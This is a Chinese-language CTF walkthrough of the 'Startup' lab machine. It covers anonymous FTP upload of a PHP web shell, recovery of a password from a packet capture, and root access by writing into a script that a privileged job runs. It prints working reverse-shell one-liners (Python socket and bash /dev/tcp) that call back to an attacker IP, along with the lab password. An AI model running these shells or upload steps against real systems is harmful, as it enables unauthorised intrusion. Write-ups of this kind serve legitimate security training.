Startup

Abuse traditional vulnerabilities via untraditional means.

端口扫描

ftp 可以匿名登录，但是里面的文件没有任何有用信息，即使图片名字是 important

ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp: 389 bytes received in 0.01Seconds 29.92Kbytes/sec.

目录扫描得到 /files，访问是一个目录结构

但是好眼熟，这不就是 ftp 里面的文件吗，也就是说 ftp 里面的文件可以在网页上查看

先测试一下，用 put 随便上传一个文件

ftp> put 1.txt

可以访问

既然如此，那就上传一个 shell 文件

ftp> put shell.php5

访问，成功拿到 www-data 权限

www-data@startup: …/files/ftp # id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

搜索属于该用户的文件，有用的只有两个

www-data@startup:/home# find / -user www-data -type f 2>/dev/null
/recipe.txt
/incidents/suspicious.pcapng

查看 recipe.txt，得到了问题里面秘制辣汤的配方

www-data@startup:/# cat recipe.txt
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.

还有一个 pcapng 就利用 wget 下载下来

查看 tcp 流，这里面尝试输入 www-data 的密码，但是错误，很显然，这个密码属于 lennie

c4ntg3t3n0ughsp1c3

由于是网页 shell，因此用 python 反弹到 kali

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.206.169",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

用 script 创建一个伪终端，再切换至用户 lennie

┌──(root㉿kali)-[~/桌面]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 7070
bash: cannot set terminal process group (1216): Inappropriate ioctl for device
bash: no job control in this shell

www-data@startup:/incidents$ script /dev/null
script /dev/null
Script started, file is /dev/null
$ su lennie
su lennie
Password: c4ntg3t3n0ughsp1c3

lennie@startup:/incidents$ id
id
uid=1002(lennie) gid=1002(lennie) groups=1002(lennie)

在 ~/scripts 文件夹里面有一个 planner.sh，且拥有读和执行的权限

该文件会将一个变量写入 startup_list.txt，同时会执行 /etc/print.sh

lennie@startup:~/scripts$ ls -al
total 16
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 May 17 04:36 startup_list.txt

lennie@startup:~/scripts$ cat planner.sh

#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

查看 /etc/print.sh，发现拥有最高权限

lennie@startup:~/scripts$ ls -al /etc/print.sh
ls -al /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh

修改该文件，写入 root 反弹命令

lennie@startup:~/scripts$ echo '#!/bin/bash' > /etc/print.sh
echo '#!/bin/bash' > /etc/print.sh
lennie@startup:~/scripts$ echo 'bash -c "bash -i >& /dev/tcp/192.168.206.169/4443 0>&1"' >> /etc/print.sh
<dev/tcp/192.168.206.169/4443 0>&1"' >> /etc/print.sh

运行 .planner.sh

lennie@startup:~/scripts$ .planner.sh
.planner.sh

成功提权
